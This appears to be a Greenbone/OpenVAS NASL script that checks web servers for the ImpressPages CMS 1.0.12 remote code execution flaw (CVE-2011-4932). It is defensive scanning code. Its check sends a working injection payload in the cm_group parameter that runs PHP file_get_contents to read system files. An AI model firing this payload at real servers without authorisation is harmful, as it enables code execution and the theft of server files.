# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103378");
  script_cve_id("CVE-2011-4932");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("ImpressPages CMS 'actions.php' RCE Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49798");
  script_xref(name:"URL", value:"http://www.impresspages.org/news/impresspages-1-0-13-security-release/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521118");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-01-06 10:27:46 +0100 (Fri, 06 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");

  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
information.");

  script_tag(name:"summary", value:"ImpressPages CMS is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"impact", value:"Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.");

  script_tag(name:"affected", value:"ImpressPages CMS 1.0.12 is vulnerable, other versions may also
be affected.");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/impress", "/impresspages", "/imprescms", "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( buf =~ "Powered by.*ImpressPages" ) {
    foreach file( keys( files ) ) {
      url = dir + "/?cm_group=text_photos\\title\\Module();echo%20file_get_contents(%27/" + files[file] + "%27);echo&cm_name=vt-test";
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
